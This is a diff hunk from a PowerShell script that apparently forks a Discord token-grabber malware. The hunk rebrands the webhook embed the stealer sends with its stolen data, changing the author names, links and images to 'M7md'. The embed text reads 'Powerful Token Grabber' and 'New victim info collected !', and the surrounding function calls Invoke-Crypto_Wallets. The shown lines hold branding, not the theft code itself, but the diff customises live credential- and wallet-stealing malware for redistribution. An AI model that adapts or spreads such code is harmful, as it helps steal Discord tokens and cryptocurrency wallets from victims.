@@ -680,24 +680,24 @@ function Backup-Data {
     Invoke-Crypto_Wallets
 
     $embed_and_body = @{
-        "username" = "KDOT"
+        "username" = "M7md"
         "content" = "@everyone"
-        "title" = "KDOT"
-        "description" = "Powerful Token Grabber"
+        "title" = "M7md"
+        "description" = "Created By M7md"
         "color" = "3447003"
         "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-        "url" = "https://discord.gg/vk3rBhcj2y"
+        "url" = "https://discord.gg/SCF"
         "embeds" = @(
             @{
-                "title" = "POWERSHELL GRABBER"
-                "url" = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
+                "title" = "M7md Grabber"
+                "url" = "https://discord.gg/scf"
                 "description" = "New victim info collected !"
                 "color" = "3447003"
                 "footer" = @{
-                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
+                    "text" = "Made by M7md"
                 }
                 "thumbnail" = @{
-                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+                    "url" = "https://cdn.discordapp.com/avatars/791145016080859166/e49052fda3789c06fe0ea121e52acd59.png?size=1024"
                 }
                 "fields" = @(
                     @{
